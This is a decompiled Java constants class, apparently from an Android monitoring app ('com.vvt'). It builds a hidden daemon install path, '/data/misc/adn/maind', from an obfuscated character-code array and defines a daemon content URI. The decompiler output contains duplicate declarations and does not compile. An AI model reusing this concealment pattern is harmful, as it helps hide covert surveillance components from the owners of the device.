package com.vvt.m;

import android.net.Uri;

public class b
{
  public static final String a;
  public static final String b;
  public static final String c;
  public static final String d;
  public static final Uri e = Uri.parse("content://com.vvt.daemon/startup_finish");
  
  static
  {
    int i = 2;
    int j = 1;
    Object[] arrayOfObject = new Object[i];
    arrayOfObject[0] = "product";
    arrayOfObject[j] = "arm64-v8a";
    a = String.format("%s/%s", arrayOfObject);
    arrayOfObject = new Object[i];
    arrayOfObject[0] = "product";
    arrayOfObject[j] = "mixer";
    b = String.format("%s/%s", arrayOfObject);
    int[] arrayOfInt = new int[14];
    int[] tmp58_57 = arrayOfInt;
    int[] tmp59_58 = tmp58_57;
    int[] tmp59_58 = tmp58_57;
    tmp59_58[0] = 47;
    tmp59_58[1] = 100;
    int[] tmp68_59 = tmp59_58;
    int[] tmp68_59 = tmp59_58;
    tmp68_59[2] = 97;
    tmp68_59[3] = 116;
    int[] tmp77_68 = tmp68_59;
    int[] tmp77_68 = tmp68_59;
    tmp77_68[4] = 97;
    tmp77_68[5] = 47;
    int[] tmp86_77 = tmp77_68;
    int[] tmp86_77 = tmp77_68;
    tmp86_77[6] = 109;
    tmp86_77[7] = 105;
    int[] tmp97_86 = tmp86_77;
    int[] tmp97_86 = tmp86_77;
    tmp97_86[8] = 115;
    tmp97_86[9] = 99;
    int[] tmp108_97 = tmp97_86;
    int[] tmp108_97 = tmp97_86;
    tmp108_97[10] = 47;
    tmp108_97[11] = 97;
    tmp108_97[12] = 100;
    tmp108_97[13] = 110;
    c = com.vvt.ag.b.a(arrayOfInt);
    arrayOfObject = new Object[j];
    String str = c;
    arrayOfObject[0] = str;
    d = String.format("%s/maind", arrayOfObject);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/m/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */